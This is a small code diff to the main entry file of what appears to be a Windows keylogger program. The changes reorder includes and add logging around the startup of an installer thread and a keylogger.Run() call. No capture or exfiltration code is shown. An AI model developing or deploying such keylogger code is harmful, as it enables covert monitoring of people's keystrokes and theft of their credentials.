@@ -1,7 +1,7 @@
 #include "stdafx.h"
+#include "Settings.h"
 #include "Logger.h"
 #include "Keylogger.h"
-#include "Settings.h"
 #include "Installer.h"
 
 DWORD WINAPI ProcInstall(LPVOID lpParameter)
@@ -19,7 +19,7 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
 	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
 	{
-		Error(_T("Already running"));
+		VLog(LMESSAGE, "Already running");
 		CloseHandle(hSem);
 		return 0;
 	}
@@ -30,8 +30,8 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 #endif
 
 	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
-	
 
+	VLog(LMESSAGE, "Started");
 	keylogger.Run();
 
 	CloseHandle(hSem);
